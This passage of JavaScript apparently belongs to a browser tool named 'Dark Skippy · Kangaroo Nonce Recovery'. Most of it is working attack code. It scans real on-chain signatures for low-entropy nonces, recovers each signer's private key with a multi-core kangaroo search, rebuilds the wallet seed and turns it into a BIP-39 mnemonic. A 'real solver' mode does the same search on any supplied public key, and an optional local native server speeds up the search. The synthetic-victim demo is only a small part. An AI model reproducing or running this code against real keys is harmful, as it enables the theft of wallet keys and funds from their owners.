                if (stats.exhausted) { out.skipped = true; results.push(out); continue; }

                var used = sigs.slice(0, maxSigs);
                if (sigs.length > maxSigs) out.capped = sigs.length;

                // Kangaroo each signature until one small nonce turns up.
                var d = null;
                for (var u = 0; u < used.length && !stats.exhausted; u++) {
                    var kreport = (function (uu) {
                        return function (steps) { post({ type: "progress", phase: "kangaroo", gi: gi, total: groups.length, addr: g.addr, sig: uu + 1, steps: steps }); };
                    })(u);
                    var got = recover(used[u].r, used[u].s, used[u].z, cpub, lo, hi, budgetMul, stats, kreport, globalBudget, salt);
                    if (got) { d = got.d; break; }
                }

                if (d !== null) {
                    out.found = true;
                    out.priv = padhex(d, 64);
                    // Sweep ALL of this signer's signatures for small nonces via d.
                    for (var j = 0; j < sigs.length; j++) {
                        var kv = nonceFor(sigs[j].r, sigs[j].s, sigs[j].z, d);
                        if (kv >= lo && kv <= hi) {
                            out.hits.push({ i: j, r: sigs[j].r, s: sigs[j].s, z: sigs[j].z, k: kv.toString(16), txid: sigs[j].txid || "" });
                        }
                    }
                    // Two (or more) small nonces = Dark Skippy: reconstruct the seed.
                    if (out.hits.length >= 2) {
                        var ka = BigInt("0x" + out.hits[0].k), kb = BigInt("0x" + out.hits[1].k);
                        out.seed = reconstruct(ka, kb, bits);
                    }
                }
                if (stats.exhausted && !out.found) out.budgetExhausted = true;
                results.push(out);
            }
            return { type: "done", mode: "scan", results: results, steps: stats.steps, exhausted: stats.exhausted, bits: bits };
        }

        // Deterministic PRNG (xoshiro256** over BigInt lanes) seeded from a hex
        // string. Used ONLY to synthesise the demo victim so that every worker in
        // the pool builds the byte-identical victim (same d, seed halves, z's) and
        // therefore races the SAME problem — the winner's result is consistent no
        // matter which core got there first.
        function mkRng(seedHex) {
            var M = (1n << 64n) - 1n;
            var seed = BigInt("0x" + (seedHex || "1")) & ((1n << 256n) - 1n);
            var st = [seed & M, (seed >> 64n) & M, (seed >> 128n) & M, (seed >> 192n) & M];
            if (!(st[0] | st[1] | st[2] | st[3])) st[0] = 0x9E3779B97F4A7C15n;
            function rotl(x, k) { return ((x << k) | (x >> (64n - k))) & M; }
            function next64() {
                var res = (rotl((st[1] * 5n) & M, 7n) * 9n) & M;
                var t = (st[1] << 17n) & M;
                st[2] ^= st[0]; st[3] ^= st[1]; st[1] ^= st[2]; st[0] ^= st[3];
                st[2] ^= t; st[3] = rotl(st[3], 45n);
                return res;
            }
            return {
                bits: function (nb) { var o = 0n, g = 0; while (g < nb) { o = (o << 64n) | next64(); g += 64; } return o & ((1n << BigInt(nb)) - 1n); },
                range: function (maxExcl) { if (maxExcl <= 1n) return 0n; var nb = maxExcl.toString(2).length + 32; return this.bits(nb) % maxExcl; }
            };
        }

        // ---- demo: synthesise a victim and crack it end-to-end ------------
        function doDemo(data, post) {
            var bits = data.bits;
            var budgetMul = data.budgetMul || 16;
            var lo = 1n, hi = (1n << BigInt(bits)) - 1n;
            var hlen = Math.ceil(bits / 4);
            var globalBudget = data.globalBudget || 0;         // main sets a wall-clock-safe cap
            var salt = data.salt ? BigInt(data.salt) : 0n;     // per-core walk decorrelation
            var rng = data.victimSeed ? mkRng(data.victimSeed) : null;
            var rr = function (maxExcl) { return rng ? rng.range(maxExcl) : randRange(maxExcl); };

            var d = rng ? (rr(N - 1n) + 1n) : randRange(N);    // victim signing key
            var Q = mul(d); var cpub = compressPoint(Q);
            var halves = [rr(1n << BigInt(bits)), rr(1n << BigInt(bits))]; // seed halves = the nonces
            var secret = reconstruct(halves[0], halves[1], bits);

            var sigs = [];
            for (var i = 0; i < 2; i++) {
                var z = rr(N);
                var sg = sign(d, halves[i], z);
                sigs.push({ k: halves[i], z: z, r: sg.r, s: sg.s });
            }

            var stats = { steps: 0, exhausted: false };
            var rec = [];
            for (var m = 0; m < 2; m++) {
                (function (idx) {
                    post({ type: "progress", phase: "demo", half: idx + 1, total: 2, steps: stats.steps });
                    var rHex = hx(sigs[idx].r), sHex = hx(sigs[idx].s), zHex = hx(sigs[idx].z);
                    var report = function (steps) { post({ type: "progress", phase: "demo", half: idx + 1, total: 2, steps: steps }); };
                    rec.push(recover(rHex, sHex, zHex, cpub, lo, hi, budgetMul, stats, report, globalBudget, salt));
                })(m);
            }

            var okAll = !!(rec[0] && rec[1]);
            var recK1 = rec[0] ? rec[0].k : null, recK2 = rec[1] ? rec[1].k : null;
            var recD = rec[0] ? rec[0].d : (rec[1] ? rec[1].d : null);
            var match = okAll && recK1 === halves[0] && recK2 === halves[1] && rec[0].d === d && rec[1].d === d;

            return {
                type: "done", mode: "demo", bits: bits, ok: okAll, match: match,
                steps: stats.steps, sqrt: bigSqrt(1n << BigInt(bits)).toString(),
                victim: {
                    privHex: hx(d), cpub: cpub,
                    h1Hex: padhex(halves[0], hlen), h2Hex: padhex(halves[1], hlen),
                    secretHex: secret.secretHex, secretBits: secret.secretBits,
                    sigs: sigs.map(function (sg) { return { rHex: hx(sg.r), sHex: hx(sg.s), zHex: hx(sg.z), kHex: padhex(sg.k, hlen) }; })
                },
                recovered: {
                    k1Hex: recK1 !== null ? padhex(recK1, hlen) : null,
                    k2Hex: recK2 !== null ? padhex(recK2, hlen) : null,
                    privHex: recD !== null ? hx(recD) : null,
                    secretHex: (recK1 !== null && recK2 !== null) ? reconstruct(recK1, recK2, bits).secretHex : null,
                    secretBits: secret.secretBits
                }
            };
        }

        // ---- real solver: recover the actual private key of a real public key
        // over a real keyspace [start,end] (hex). This is the browser-side twin of
        // kangaroo.py: pubkey + range in -> private key out, verified by d*G == pub
        // so a hit is never a false positive. `salt` decorrelates the pool cores.
        function doSolve(data, post) {
            var pt = pubToPoint(data.pub);
            if (!pt) return { type: "done", mode: "solve", ok: false, error: "bad-pubkey", steps: 0 };
            var lo = BigInt("0x" + String(data.startHex).replace(/^0x/, ""));
            var hi = BigInt("0x" + String(data.endHex).replace(/^0x/, ""));
            if (hi < lo) { var tmp = lo; lo = hi; hi = tmp; }
            var budgetMul = data.budgetMul || 8;
            var globalBudget = data.globalBudget || 0;
            var salt = data.salt ? BigInt(data.salt) : 0n;
            var stats = { steps: 0, exhausted: false };
            var report = function (steps) { post({ type: "progress", phase: "solve", steps: steps }); };
            var k = kangaroo(pt, lo, hi, budgetMul, stats, report, globalBudget, salt);
            var ok = false, privHex = null;
            if (k !== null && k >= lo && k <= hi) {
                var Rc = mul(k);
                if (Rc && Rc.x === pt.x && Rc.y === pt.y) { ok = true; privHex = hx(k); }
            }
            return {
                type: "done", mode: "solve", ok: ok, exhausted: stats.exhausted, steps: stats.steps,
                privHex: privHex, cpub: compressPoint(pt),
                startHex: hx(lo).replace(/^0+(?=.)/, ""), endHex: hx(hi).replace(/^0+(?=.)/, ""),
                sqrt: bigSqrt(hi - lo > 0n ? hi - lo : 0n).toString()
            };
        }

        self.onmessage = function (e) {
            try {
                var data = e.data || {};
                var post = function (msg) { postMessage(msg); };
                if (data.cmd === 'demo') postMessage(doDemo(data, post));
                else if (data.cmd === 'solve') postMessage(doSolve(data, post));
                else postMessage(doScan(data, post));
            } catch (err) {
                postMessage({ type: "error", message: (err && err.message) ? err.message : String(err) });
            }
        };
    }

    var WORKER_SRC = '(' + dsWorkerBody.toString() + ')()';
    var _dsWorkerURL = null;
    function buildWorker() {
        try {
            if (typeof Worker === 'undefined' || typeof URL === 'undefined' || !URL.createObjectURL) return null;
            if (!_dsWorkerURL) _dsWorkerURL = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'application/javascript' }));
            return new Worker(_dsWorkerURL);
        } catch (e) { return null; }
    }

    // ---- CPU core selection ---------------------------------------------
    // The page has a #ds-cores <select> listing every core the machine (or the
    // native server) reports. Whatever the user picks is used; when nothing is
    // picked the default is 4 — never more, no matter how many cores exist.
    function selectedCores() {
        var el = (typeof document !== 'undefined') ? document.getElementById('ds-cores') : null;
        if (el && el.value) { var v = parseInt(el.value, 10); if (v > 0) return v; }
        return 0;                                          // 0 == "no explicit choice"
    }
    // (Re)build the core dropdown to 1..maxCores. Keeps a prior valid pick; else
    // defaults the selection to 4 (or the max if the machine has fewer than 4).
    function populateCoreOptions(maxCores) {
        var el = (typeof document !== 'undefined') ? document.getElementById('ds-cores') : null;
        if (!el) return;
        var max = Math.max(1, Math.min(256, (maxCores | 0) || 4));
        var def = Math.min(4, max);
        var prev = el.value ? parseInt(el.value, 10) : 0;
        var want = (prev > 0 && prev <= max) ? prev : def;
        if (el.options.length !== max) {                   // only rebuild when the count changed
            var html = '';
            for (var i = 1; i <= max; i++) {
                var tag = (i === def) ? ' — default' : (i === max ? ' — max' : '');
                html += '<option value="' + i + '">' + i + ' core' + (i > 1 ? 's' : '') + tag + '</option>';
            }
            el.innerHTML = html;
        }
        el.value = String(want);
    }
    // Cores for the NATIVE engine: the user's pick (capped to what the server has),
    // or 4 by default. `avail` is the server's reported core count (e.g. 32).
    function nativeCoresFor(avail) {
        var max = (avail && avail > 0) ? avail : 32;
        var sel = selectedCores();
        if (sel > 0) return Math.max(1, Math.min(max, sel));
        return Math.max(1, Math.min(4, max));              // default = 4
    }
    // ---- engine configuration -------------------------------------------
    function cfg() { return (typeof window !== 'undefined' && window.CGT_CONFIG) ? window.CGT_CONFIG : {}; }
    // Cores for the in-browser worker pool: the user's pick (never more than the
    // machine's real logical cores), else CGT_CONFIG override, else 4 by default.
    function kangarooCores() {
        var hw = (typeof navigator !== 'undefined' && navigator.hardwareConcurrency) ? navigator.hardwareConcurrency : 4;
        var sel = selectedCores();
        if (sel > 0) return Math.max(1, Math.min(hw, sel));
        var c = cfg().kangarooCores;
        if (c && c > 0) return Math.max(1, Math.min(16, c | 0));
        return Math.max(1, Math.min(4, hw));               // default = 4
    }
    // Distinct per-core wild-walk offset. Even a difference of 1 fully decorrelates
    // the deterministic walk (the jump index is derived from the point's x), so the
    // cores explore independent trajectories and the first to collide wins. Core 0
    // gets salt 0 = the exact, proven single-walk behaviour.
    function saltFor(i) { return String(i); }

    var nowMs = function () { return (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now(); };

    // ---- multi-core worker pool -----------------------------------------
    // Runs `cores` workers on the SAME job with distinct salts; the first to post
    // a `done` wins and the rest are terminated. Aggregates hops across all cores
    // and emits ~5 live frames/sec via onProgress so the page shows real-time
    // speed. Resolves the winning `done` payload (with __hops/__cores/__elapsed),
    // or {__noWorker:true} when Web Workers are unavailable.
    function runPool(cmd, payload, onProgress) {
        return new Promise(function (resolve) {
            var cores = kangarooCores();
            var workers = [], latest = [], errs = 0;
            for (var i = 0; i < cores; i++) latest.push(0);
            var t0 = nowMs(), settled = false, timer = null, prev = null;
            function agg() { var t = 0; for (var i = 0; i < latest.length; i++) t += latest[i]; return t; }
            function frame(extra) {
                if (settled) return;
                var el = (nowMs() - t0) / 1000, hops = agg(), inst = 0;
                if (prev) { var dt = el - prev.el; if (dt > 0) inst = (hops - prev.hops) / dt; }
                prev = { el: el, hops: hops };
                var f = { engine: 'js', cores: cores, hops: hops, per: latest.slice(), elapsed: el, rate: inst, rateAvg: el > 0 ? hops / el : 0 };
                if (extra) for (var k in extra) f[k] = extra[k];
                if (onProgress) try { onProgress(f); } catch (e) { }
            }
            function cleanup() { if (timer) { clearInterval(timer); timer = null; } for (var i = 0; i < workers.length; i++) { try { workers[i].terminate(); } catch (e) { } } }
            function finish(done) {
                if (settled) return; settled = true;
                var el = (nowMs() - t0) / 1000, hops = agg();
                cleanup();
                done.__hops = hops; done.__cores = cores; done.__elapsed = el; done.__rateAvg = el > 0 ? hops / el : 0;
                resolve(done);
            }
            for (var c = 0; c < cores; c++) {
                var w = buildWorker();
                if (!w) { cleanup(); resolve({ __noWorker: true }); return; }
                (function (w, idx) {
                    w.onmessage = function (ev) {
                        var d = ev.data;
                        if (d.type === 'progress') { if (typeof d.steps === 'number') latest[idx] = d.steps; frame({ phase: d.phase, gi: d.gi, total: d.total, addr: d.addr, count: d.count, sig: d.sig, half: d.half }); }
                        else if (d.type === 'done') { if (typeof d.steps === 'number') latest[idx] = d.steps; finish(d); }
                        else if (d.type === 'error') { errs++; if (errs >= cores && !settled) finish({ type: 'done', mode: cmd, ok: false, error: d.message || 'worker-error', steps: agg() }); }
                    };
                    w.onerror = function () { errs++; if (errs >= cores && !settled) finish({ type: 'done', mode: cmd, ok: false, error: 'worker-error', steps: agg() }); };
                    workers.push(w);
                })(w, c);
            }
            for (var c2 = 0; c2 < workers.length; c2++) {
                var m = {}; for (var k2 in payload) m[k2] = payload[k2];
                m.cmd = cmd; m.salt = saltFor(c2);
                workers[c2].postMessage(m);
            }
            timer = setInterval(frame, 200);
            frame();
        });
    }

    // Group extracted signatures by signing public key (one signer each).
    function groupByPub(rsz) {
        var map = {};
        for (var i = 0; i < rsz.length; i++) {
            var e = rsz[i];
            if (!e.pub || !e.r || !e.s || !e.z) continue;
            if (!map[e.pub]) map[e.pub] = { pub: e.pub, addr: e.addr, sigs: [] };
            map[e.pub].sigs.push({ r: e.r, s: e.s, z: e.z, txid: e.txid || '' });
        }
        return Object.keys(map).map(function (k) { return map[k]; });
    }

    // ---- native backend (kgaroocgtegein) client -------------------------
    // Talks to the optional local Python server that drives Kangaroo_CPU.dll via
    // kangaroo.py and streams its real speed. Only reachable on localhost (an
    // HTTPS live site can't open http://127.0.0.1 — mixed content), which is
    // exactly the intended "PC/laptop only" boost.
    var Native = (function () {
        function base() {
            var c = cfg();
            if (c.kangarooUrl) return String(c.kangarooUrl).replace(/\/+$/, '');
            var h = (typeof location !== 'undefined') ? location.hostname : '';
            if (h === '127.0.0.1' || h === 'localhost' || h === '::1' || h === '[::1]') return 'http://127.0.0.1:3001';
            return null;
        }
        var _cache = undefined;
        function health(force) {
            var b = base();
            if (!b) return Promise.resolve(null);
            if (_cache !== undefined && !force) return Promise.resolve(_cache);
            var ctl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
            var to = ctl ? setTimeout(function () { try { ctl.abort(); } catch (e) { } }, 1400) : null;
            return fetch(b + '/health', ctl ? { signal: ctl.signal } : {})
                .then(function (r) { if (to) clearTimeout(to); return r.ok ? r.json() : null; })
                .then(function (j) { _cache = (j && j.ok) ? Object.assign({ base: b }, j) : null; return _cache; })
                .catch(function () { if (to) clearTimeout(to); _cache = null; return null; });
        }
        // Stream a real kangaroo run. onProgress gets native frames; resolves
        // {ok:true, privHex} on a find, {ok:false} otherwise, null if unreachable.
        function run(pub, startHex, endHex, cores, onProgress, onDone) {
            return new Promise(function (resolve) {
                var b = base();
                if (!b || typeof EventSource === 'undefined') { resolve(null); return; }
                var u = b + '/kangaroo/stream?pub=' + encodeURIComponent(pub) +
                    '&start=' + encodeURIComponent(startHex) + '&end=' + encodeURIComponent(endHex) +
                    '&ncore=' + (cores || 4);
                var es, done = false, wd = null;
                var IDLE_MS = 15000;                          // no frame for 15s == broken/stalled
                function fin(v) { if (done) return; done = true; if (wd) { clearTimeout(wd); wd = null; } try { es.close(); } catch (e) { } resolve(v); }
                // Idle watchdog: a live DLL streams frames constantly, so a long
                // silence means the server connected but wedged (the classic
                // "Cores N / hops 0" freeze). Bail so the caller can fall back.
                function kick() { if (wd) clearTimeout(wd); wd = setTimeout(function () { fin({ ok: false, engine: 'native', error: 'stream-timeout' }); }, IDLE_MS); }
                try { es = new EventSource(u); } catch (e) { resolve(null); return; }
                es.addEventListener('progress', function (ev) { kick(); if (onProgress) try { onProgress(JSON.parse(ev.data)); } catch (e) { } });
                es.addEventListener('found', function (ev) { var d = {}; try { d = JSON.parse(ev.data); } catch (e) { } fin({ ok: true, privHex: d.privHex || null, engine: 'native' }); });
                es.addEventListener('done', function (ev) { var d = {}; try { d = JSON.parse(ev.data); } catch (e) { } fin({ ok: !!d.ok, privHex: d.privHex || null, engine: 'native' }); });
                es.onerror = function () { fin(done ? null : { ok: false, engine: 'native', error: 'stream-error' }); };
                Native._active = es;
                kick();                                       // arm the idle watchdog immediately
            });
        }
        function stop() { try { if (Native._active) Native._active.close(); } catch (e) { } }
        return { health: health, run: run, stop: stop, base: base, _active: null };
    })();

    // ---- main-thread secp256k1 (native-engine nonce recovery) ------------
    // The full EC math normally lives inside the Web Worker string. When the
    // native (kgaroocgtegein) engine drives the on-chain scan, the recovery is
    // orchestrated here on the main thread instead — we feed each signature's
    // nonce point R to the DLL and rebuild d locally — so the page needs a
    // compact copy of the same primitives. This mirrors dsWorkerBody()'s
    // helpers byte-for-byte so both engines accept a hit on identical terms.
    var EC = (function () {
        var P = (2n ** 256n) - (2n ** 32n) - 977n;
        var Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
        var Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;
        function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
        function inv(a, m) {
            a = mod(a, m);
            if (a === 0n) throw new Error("no inverse");
            var m0 = m, x0 = 0n, x1 = 1n, aa = a, mm = m;
            while (aa > 1n) {
                if (mm === 0n) throw new Error("no inverse");
                var q = aa / mm;
                var t = mm; mm = aa % mm; aa = t;
                t = x0; x0 = x1 - q * x0; x1 = t;
            }
            if (x1 < 0n) x1 += m0;
            return x1;
        }
        function add(Pp, Qp) {
            if (!Pp) return Qp; if (!Qp) return Pp;
            if (Pp.x === Qp.x && mod(Pp.y + Qp.y, P) === 0n) return null;
            var l;
            if (Pp.x === Qp.x && Pp.y === Qp.y) l = mod(3n * Pp.x * Pp.x * inv(2n * Pp.y, P), P);
            else l = mod((Qp.y - Pp.y) * inv(mod(Qp.x - Pp.x, P), P), P);
            var x = mod(l * l - Pp.x - Qp.x, P);
            var y = mod(l * (Pp.x - x) - Pp.y, P);
            return { x: x, y: y };
        }
        function mul(k) { k = mod(k, N); var R = null, A = { x: Gx, y: Gy }; while (k > 0n) { if (k & 1n) R = add(R, A); A = add(A, A); k >>= 1n; } return R; }
        function powmod(a, e, m) { a = mod(a, m); var r = 1n; while (e > 0n) { if (e & 1n) r = mod(r * a, m); a = mod(a * a, m); e >>= 1n; } return r; }
        function ysqrt(x) { var a = mod(x * x * x + 7n, P); var y = powmod(a, (P + 1n) / 4n, P); return mod(y * y, P) === a ? y : null; }
        function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
        function padhex(v, len) { var s = v.toString(16); while (s.length < len) s = "0" + s; return s; }
        function compressPoint(Q) { return (Q.y & 1n ? "03" : "02") + hx(Q.x); }
        function compressPub(pub) {
            pub = (pub || "").toLowerCase();
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                var x = pub.slice(2, 66), y = BigInt("0x" + pub.slice(66));
                return (y & 1n ? "03" : "02") + x;
            }
            return null;
        }
        function pubToPoint(pub) {
            pub = (pub || "").toLowerCase().replace(/^0x/, "");
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) {
                var x = BigInt("0x" + pub.slice(2));
                var y = ysqrt(x); if (y === null) return null;
                var want = pub.slice(0, 2) === "03" ? 1n : 0n;
                if ((y & 1n) !== want) y = mod(P - y, P);
                return { x: x, y: y };
            }
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                return { x: BigInt("0x" + pub.slice(2, 66)), y: BigInt("0x" + pub.slice(66)) };
            }
            return null;
        }
        function nonceFor(rHex, sHex, zHex, d) {
            var r = BigInt("0x" + rHex), s = BigInt("0x" + sHex), z = BigInt("0x" + zHex);
            return mod(inv(s, N) * (mod(z, N) + mod(r, N) * d), N);
        }
        function reconstruct(kHi, kLo, bits) {
            var secretBits = bits * 2;
            var hexlen = Math.ceil(secretBits / 4);
            function cat(hiv, lov) { return padhex((hiv << BigInt(bits)) | lov, hexlen); }
            return { secretBits: secretBits, secretHex: cat(kHi, kLo), altHex: cat(kLo, kHi) };
        }
        return {
            P: P, N: N, mod: mod, inv: inv, add: add, mul: mul, powmod: powmod,
            ysqrt: ysqrt, hx: hx, padhex: padhex, compressPoint: compressPoint,
            compressPub: compressPub, pubToPoint: pubToPoint, nonceFor: nonceFor,
            reconstruct: reconstruct
        };
    })();

    // ---- Worker drivers --------------------------------------------------
    // Scan real signatures with the multi-core pool. Resolves
    // {groups, results, steps, exhausted, bits}: results = per-signer verdicts,
    // [] = no signers, null = worker unavailable.
    function runScan(rsz, opts, onProgress) {
        return new Promise(function (resolve) {
            var groups = groupByPub(rsz);
            if (!groups.length) { resolve({ groups: groups, results: [] }); return; }
            runPool('scan', {
                groups: groups.map(function (g) { return { addr: g.addr, pub: g.pub, sigs: g.sigs }; }),
                bits: opts.bits, budgetMul: 8, maxSigs: 6, globalBudget: opts.globalBudget || 3000000
            }, onProgress).then(function (d) {
                if (!d || d.__noWorker) { resolve({ groups: groups, results: null }); return; }
                resolve({ groups: groups, results: d.results || null, steps: d.steps, exhausted: d.exhausted, bits: d.bits, error: d.error });
            });
        });
    }

    // Native (kgaroocgtegein) on-chain scan — the native twin of runScan().
    // Same job (recover each signer's low-entropy nonces, then rebuild the key),
    // but every nonce's Kangaroo search runs on the local multi-core DLL instead
    // of the JS worker pool, so the range can be far larger than the browser can
    // reach. Per signature we hand the nonce point R (x = r, both y-parities) to
    // the DLL over [1, 2^bits-1]; the scalar it returns IS the nonce k. Then
    // d = (s*k - z)/r is rebuilt + verified HERE (d*G must reproduce the on-chain
    // pubkey), so a hit is never a false positive — identical acceptance test to
    // the worker's recover(). Resolves the SAME shape runScan() does so
    // renderScan()/annotateRows() are unchanged. Resolves {results:null,error}
    // when the native engine is offline or its DLL isn't ready, so processTxid
    // can fall back to the in-browser engine transparently.
    async function runScanNative(rsz, opts, onProgress) {
        var groups = groupByPub(rsz);
        if (!groups.length) return { groups: groups, results: [] };
        var health = await Native.health(true);
        if (!health || !health.ready) {
            return { groups: groups, results: null, error: health ? 'native-not-ready' : 'native-offline' };
        }

        var bits = opts.bits;
        var lo = 1n, hi = (1n << BigInt(bits)) - 1n;
        var startHex = '1', endHex = (EC.hx(hi).replace(/^0+(?=.)/, '') || '1');
        var cores = nativeCoresFor(health.cores);
        var maxSigs = opts.maxSigs || 4;
        var results = [];

        for (var gi = 0; gi < groups.length; gi++) {
            var g = groups[gi];
            if (onProgress) onProgress({ engine: 'native', phase: 'signer', gi: gi, total: groups.length, addr: g.addr, count: g.sigs.length });

            // de-dupe identical (r,s,z) exactly like the worker scan path
            var seen = {}, sigs = [];
            for (var i = 0; i < g.sigs.length; i++) {
                var sg = g.sigs[i];
                var kk = sg.r + '_' + sg.s + '_' + sg.z;
                if (!seen[kk]) { seen[kk] = 1; sigs.push(sg); }
            }
            var out = { addr: g.addr, pub: g.pub, count: sigs.length, found: false, hits: [], bits: bits };
            var cpub = EC.compressPub(g.pub);
            if (!cpub || sigs.length < 1) { results.push(out); continue; }

            var used = sigs.slice(0, maxSigs);
            if (sigs.length > maxSigs) out.capped = sigs.length;

            // Kangaroo each signature on the DLL until one small nonce turns up.
            var d = null;
            for (var u = 0; u < used.length && d === null; u++) {
                d = await recoverNonceNative(used[u], cpub, lo, hi, startHex, endHex, cores,
                    (function (uu, ggi, gg) {
                        return function (fr) {
                            if (onProgress) onProgress(Object.assign(
                                { engine: 'native', phase: 'kangaroo', gi: ggi, total: groups.length, addr: gg.addr, sig: uu + 1 },
                                fr || {}));
                        };
                    })(u, gi, g));
            }

            if (d !== null) {
                out.found = true;
                out.priv = EC.padhex(d, 64);
                // Sweep ALL of this signer's signatures for small nonces via d.
                for (var j = 0; j < sigs.length; j++) {
                    var kv = EC.nonceFor(sigs[j].r, sigs[j].s, sigs[j].z, d);
                    if (kv >= lo && kv <= hi) {
                        out.hits.push({ i: j, r: sigs[j].r, s: sigs[j].s, z: sigs[j].z, k: kv.toString(16), txid: sigs[j].txid || '' });
                    }
                }
                // Two (or more) small nonces = Dark Skippy: reconstruct the seed.
                if (out.hits.length >= 2) {
                    var ka = BigInt('0x' + out.hits[0].k), kb = BigInt('0x' + out.hits[1].k);
                    out.seed = EC.reconstruct(ka, kb, bits);
                }
            }
            results.push(out);
        }
        return { groups: groups, results: results, exhausted: false, bits: bits, engine: 'native' };
    }

    // Recover one signature's nonce on the native DLL. R's x-coordinate is r, so
    // we try both y-parities (we can't know which the signer used); the wrong
    // parity has no small scalar, so the DLL sweeps its range and returns
    // not-found, then we try the other. k*G == R and d*G == pubkey are both
    // verified before accepting, so this can't yield a false positive. Returns
    // the signing key d (BigInt) or null. Returns null immediately if the server
    // vanishes mid-run (Native.run resolves null).
    async function recoverNonceNative(sig, cpub, lo, hi, startHex, endHex, cores, onFrame) {
        var r = BigInt('0x' + sig.r);
        var y0 = EC.ysqrt(r);
        if (y0 === null) return null;
        var ys = [y0, EC.mod(EC.P - y0, EC.P)];
        var s = BigInt('0x' + sig.s), z = BigInt('0x' + sig.z);
        for (var yi = 0; yi < 2; yi++) {
            var R = { x: r, y: ys[yi] };
            var nres = await Native.run(EC.compressPoint(R), startHex, endHex, cores, onFrame);
            if (!nres) return null;                       // server went away
            if (!nres.ok || !nres.privHex) continue;      // not found on this parity
            var k = BigInt('0x' + nres.privHex);
            if (k < lo || k > hi) continue;
            var Rc = EC.mul(k);
            if (!Rc || Rc.x !== R.x || Rc.y !== R.y) continue;
            var d = EC.mod((EC.mod(s * k, EC.N) - EC.mod(z, EC.N)) * EC.inv(r, EC.N), EC.N);
            if (d <= 0n || d >= EC.N) continue;
            var Q = EC.mul(d);
            if (Q && EC.compressPoint(Q) === cpub) return d;
        }
        return null;
    }

    // Real solver (browser, JS multi-core). Recovers the actual private key of a
    // real pubkey over [startHex,endHex]. Resolves the worker's done payload,
    // or {__noWorker:true} when a Worker can't be created.
    function runSolveJS(opts, onProgress) {
        return runPool('solve', {
            pub: opts.pub, startHex: opts.startHex, endHex: opts.endHex,
            budgetMul: opts.budgetMul || 8, globalBudget: opts.globalBudget || 0
        }, onProgress);
    }

    // ---- BIP-39 mnemonic (main thread; CryptoJS for the checksum) --------
    var _wordlist = null;
    async function loadWordlist() {
        if (_wordlist) return _wordlist;
        try {
            const r = await fetch('../assets/data/bip39-english.txt', { signal: AbortSignal.timeout(8000) });
            if (!r.ok) return null;
            const t = await r.text();
            const arr = t.split(/\r?\n/).map(function (s) { return s.trim(); }).filter(Boolean);
            if (arr.length >= 2048) { _wordlist = arr.slice(0, 2048); return _wordlist; }
        } catch (e) { /* offline / blocked */ }
        return null;
    }
    // entropy hex -> mnemonic, only for a standard entropy length (128..256 bits).
    function entropyToMnemonic(hex, words) {
        if (!words || !hex) return null;
        const bits = hex.length * 4;
        if ([128, 160, 192, 224, 256].indexOf(bits) === -1) return null;
        const csBits = bits / 32;
        const hash = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString();
        let b = '';
        for (let i = 0; i < hex.length; i++) b += parseInt(hex[i], 16).toString(2).padStart(4, '0');
        let cb = '';
        for (let j = 0; j < hash.length && cb.length < csBits; j++) cb += parseInt(hash[j], 16).toString(2).padStart(4, '0');
        b += cb.slice(0, csBits);
        const out = [];
        for (let p = 0; p < b.length; p += 11) out.push(words[parseInt(b.slice(p, p + 11), 2)]);
        return out.join(' ');
    }

    // ---- Output header + export (de-branded) -----------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">Dark Skippy &middot; Kangaroo Nonce Recovery</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }

    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }

        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let rawText = el.innerText || el.textContent;

        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;

        const fullContent = headerText + rawText;

        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `CryptographyTube_DarkSkippy_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }

    // one mono value + copy button (TXID, recovered key, R/S/Z, pubkey…)
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }
    // key/value row used inside the demo panels
    function kvRow(label, val, extraCls) {
